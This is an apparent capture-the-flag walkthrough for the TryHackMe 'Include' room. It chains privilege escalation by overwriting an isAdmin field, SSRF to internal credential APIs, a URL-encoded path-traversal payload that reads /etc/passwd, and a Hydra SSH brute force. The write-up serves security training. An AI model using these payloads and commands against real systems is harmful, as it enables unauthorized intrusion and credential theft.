# Include Walkthrough 
<br/>

## Intro
Welcome to the Include challenge, here is the link to the [room](https://tryhackme.com/room/include) on TryHackMe.

This challenge is an initial test to evaluate your capabilities in web pentesting, particularly for server-side attacks. 
_"Even if it's not accessible from the browser, can you still find a way to capture the flags and sneak into the secret admin panel?"_

Whenever you feel ready press "Start Machine" and connect via OpenVPN or using the AttackBox

Let's begin!

<br/>
<br/>

## The Challenge
Let's begin with a port scan of the target:
```bash
rustscan -a MACHINE_IP -r 0-65000 --ulimit 5000 -- -sV
```

This will gives us the following open ports hosting services:
```
PORT    STATE SERVICE  REASON         VERSION
22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
25/tcp  open  smtp     syn-ack ttl 63 Postfix smtpd
110/tcp open  pop3     syn-ack ttl 63 Dovecot pop3d
143/tcp open  imap     syn-ack ttl 63 Dovecot imapd (Ubuntu)
993/tcp open  ssl/imap syn-ack ttl 63 Dovecot imapd (Ubuntu)
995/tcp open  ssl/pop3 syn-ack ttl 63 Dovecot pop3d
4000/tcp open  http    Node.js (Express middleware)
50000/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: Host:  mail.filepath.lab; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Lets visit `http://10.10.238.149:50000/`, the landing page tells us that this is a restricted portal for only authorized personnel.

Let's go a directory scan to see if we can find anything interesting:
```bash
gobuster dir -u http://10.10.238.149:50000/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 160
```

We find:
```
/.hta                 (Status: 403) [Size: 281]
/.htpasswd            (Status: 403) [Size: 281]
/index.php            (Status: 200) [Size: 1611]
/javascript           (Status: 301) [Size: 328] [--> http://10.10.238.149:50000/javascript/]
/.htaccess            (Status: 403) [Size: 281]
/phpmyadmin           (Status: 403) [Size: 281]
/server-status        (Status: 403) [Size: 281]
/templates            (Status: 301) [Size: 327] [--> http://10.10.238.149:50000/templates/]
/uploads              (Status: 301) [Size: 325] [--> http://10.10.238.149:50000/uploads/]
```

A quick test showed that we only have access to `/templates` and `/uploads` but neither of them contained anything directly useful.
But their presence suggest that there might be an upload functionality somewhere, maybe vulnerable? or a chance to edit a template later in the exploit chain?

For the moment on that service is all, let's take now a look at the other HTTP one, served on port `4000`, here we find a login where it tells to use the credentials `guest:gust`.

After login we see a page where we can view our profile + 2 others and choose if we want to add them as friends.
There is also a functionality to "Recommend an Activity to guest" in our profile.

To better understand how this functions are working we can enable Burp Suite Proxy and capture the request while doing actions on what we have just found.

If we watch the guest details:
```
Friend Details
id: 1
name: "guest"
age: 25
country: "UK"
albums: [{"name":"USA Trip","photos":"www.thm.me"}]
isAdmin: "false"
profileImage: "/images/prof1.avif"
```

And we try to add a recommended activity filling the 2 forms with "test1" and "test2" something happens:
This gets added in the details:
```
test1: "test2"
```

Another thing worth of notice is that in the details there is an "isAdmin" field, maybe we can change its value? 

So i have tried to submit a new recommended activity  type `isAdmin` with name `true` this successfully overwrites the previous value and the app sees us as admin; we can confirm that as in the top right of the page 2 new fields appears: "API" and "Settings" when we previously could only log out or visit or home.

In the API page we can see some docs of 2 endpoints:

Internal API:
```http
GET http://127.0.0.1:5000/internal-api HTTP/1.1
Host: 127.0.0.1:5000

Response:
{
  "secretKey": "superSecretKey123",
  "confidentialInfo": "This is very confidential."
}
```

Get Admins API:
```http
GET http://127.0.0.1:5000/getAllAdmins101099991 HTTP/1.1
Host: 127.0.0.1:5000

Response:
{
    "ReviewAppUsername": "admin",
    "ReviewAppPassword": "xxxxxx",
    "SysMonAppUsername": "administrator",
    "SysMonAppPassword": "xxxxxxxxx",
}
```

Looking at the requests we can understand that both APIs are reachable only by the internal network.
Also the second one shows us that the response contains the credentials for the sysmon app login, the one we saw on port 50000, but the password is redacted.

We need to replicate the request and get those creds.

Moving to the "settings" page we can see an upload functionality, where we can send an image URL to update the banner image.

Since it takes an URL we can try to test it to see if it vulnerable to SSRF by submitting the: `http://127.0.0.1:5000/getAllAdmins101099991`
It works, it prints:
```
data:application/json; charset=utf-8;base64,eyJSZXZpZXdBcHBVc2VybmFtZSI6ImFkbWluIiwiUmV2aWV3QXBwUGFzc3dvcmQiOiJhZG1pbkAhISEiLCJTeXNNb25BcHBVc2VybmFtZSI6ImFkbWluaXN0cmF...REDACTED-FOR-THE-WRITEUP
```

Now we can isolate the base64 data and decode it:
```bash
echo "eyJSZXZpZXdBcHBVc2VybmFtZSI6ImFkbWluIiwiUmV2aWV3QXBwUGFzc3dvcmQiOiJhZG1pbkAhISEiLCJTeXNNb25BcHBVc2VybmFtZSI6ImFkbWluaXN-REDACTED-FOR-THE-WRITEUP" | base64 -d | jq
```
(i pass it also to `jq` to format the JSON output nicely)

We get:
```json
{
  "ReviewAppUsername": "admin",
  "ReviewAppPassword": "REDACTED-FOR-THE-WRITEUP",
  "SysMonAppUsername": "administrator",
  "SysMonAppPassword": "REDACTED-FOR-THE-WRITEUP"
}
```

Now with this credentials we can access the sysmon app at: `http://10.10.238.149:50000/login.php`
After login, on the left, we can find the first flag:
--> REDACTED

Looking at the page source we can see that the profile image, the one contained in the "uplaods" directory, is called via the `img` URL parameter:
```
http://10.10.238.149:50000/profile.php?img=profile.png
```

Usually when we see URL parameters we should test them for injection vulerabilties, starting with an easy directory traversal let's see if we can read any other file on the server.
The basic approach is to add a certain number of `../../` to "go back" in the directory tree hierarchy, from the current directory to the root, and then submit the path to the file we want to access.
Since it is a well known vulnerability it is very often at least filtered, so like in this scenario, simply doing that wont work.

There are many ways to trick the filter, submitting sequences like: `./.././` or `....//....//` and more, if after trying a bunch of them it does not work, another option for evasion is to encode payload, usually in URL or base64, if even that does't work you could try multiple encoding layers or using other functionalities.

In our scenario the solution that worked for me was to URL encode this combination `....//....//`  to access that `/etc/passwd` file:

The final payload:
```
http://10.10.238.149:50000/profile.php?img=..%2F..%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd
```

The output shows us that there are 2 users with an home directory and access to a shell:
```
joshua:x:1002:1002:,,,:/home/joshua:/bin/bash
charles:x:1003:1003:,,,:/home/charles:/bin/bash
```

Now, since we found the SSH port open we can try to brute force the login.
Let's put the 2 names in a file called `names.txt` and attack the service with *Hydra*:
```bash
hydra -L names.txt -P ~/Documents/rockyou-small.txt 10.10.238.149 ssh
```

It appears that both users use the same password `123456`.

Let's now SSH as one of them:
```bash
ssh joshua@10.10.238.149
```

Now let's navigate to the directory containing the last flag:
```bash
cd /var/www/html
```

And open the file with an unique name:
```bash
cat 505eb0fb8a9f32853b4d955e1f9123ea.txt
```

And here we have the final flag:
--> REDACTED

<br/>
<br/>

## Conclusion
Congratulations you have successfully practiced with some web exploitation to becom admin and abused a LFI vulnerability to leak username to finally creack their SSH passwords and read the flag on the target system.

I hope you had fun doing the challenge and following along!

Catch you in the next CTF 😃 
